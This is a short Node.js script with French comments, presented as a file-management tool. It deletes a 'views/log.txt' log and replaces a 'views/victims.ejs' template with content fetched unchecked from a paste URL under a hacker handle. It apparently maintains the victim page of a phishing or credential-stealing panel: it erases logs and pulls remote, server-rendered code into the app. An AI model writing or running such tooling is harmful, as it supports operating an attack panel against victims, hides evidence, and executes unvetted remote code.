const fs = require('fs');
const https = require('https');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('\x1b[35mBienvenue dans le script de gestion de fichiers !\x1b[0m'); // Couleur violette pour le message d'accueil

// URL du fichier victims.ejs à télécharger
const fileUrl = 'https://hastebytrhacknon.trhacknon.repl.co/raw/pupujakisube';

// Chemin local du fichier victims.ejs de destination
const localVictimsFilePath = 'views/victims.ejs';

// Chemin local du fichier log.txt
const logFilePath = 'views/log.txt';

// Fonction pour télécharger un fichier depuis une URL
function downloadFile(fileUrl, localFilePath, callback) {
    const file = fs.createWriteStream(localFilePath);

    https.get(fileUrl, (response) => {
        response.pipe(file);

        file.on('finish', () => {
            file.close(() => {
                console.log('\x1b[32mTéléchargement terminé.\x1b[0m'); // Couleur verte pour le message de téléchargement réussi
                callback();
            });
        });
    }).on('error', (err) => {
        console.error('\x1b[31mErreur lors du téléchargement :', err, '\x1b[0m'); // Couleur rouge pour les erreurs
        rl.close();
    });
}

// Fonction pour supprimer un fichier s'il existe
function deleteFile(filePath, callback) {
    if (fs.existsSync(filePath)) {
        fs.unlink(filePath, (err) => {
            if (err) {
                console.error('\x1b[31mErreur lors de la suppression du fichier :', err, '\x1b[0m'); // Couleur rouge pour les erreurs
            } else {
                console.log('\x1b[32mFichier supprimé avec succès.\x1b[0m'); // Couleur verte pour la réussite
            }
            callback();
        });
    } else {
        console.log('\x1b[33mLe fichier ' + filePath + ' n\'existe pas.\x1b[0m'); // Couleur jaune pour avertir que le fichier n'existe pas
        callback();
    }
}

// Demander à l'utilisateur quelle action il souhaite effectuer
rl.question('\x1b[36mQue souhaitez-vous faire ? (\x1b[31m1: Effacer log.txt\x1b[36m, \x1b[34m2: Remplacer victims.ejs\x1b[36m, \x1b[35m3: Effacer log.txt et remplacer victims.ejs\x1b[36m) : \x1b[0m', (answer) => {
    if (answer === '1') {
        // Effacer log.txt
        deleteFile(logFilePath, () => {
            rl.close();
        });
    } else if (answer === '2') {
        // Remplacer victims.ejs
        downloadFile(fileUrl, localVictimsFilePath, () => {
            rl.close();
        });
    } else if (answer === '3') {
        // Effacer log.txt et remplacer victims.ejs
        deleteFile(logFilePath, () => {
            downloadFile(fileUrl, localVictimsFilePath, () => {
                rl.close();
            });
        });
    } else {
        console.log('\x1b[31mChoix non valide.\x1b[0m'); // Couleur rouge pour les erreurs
        rl.close();
    }
});
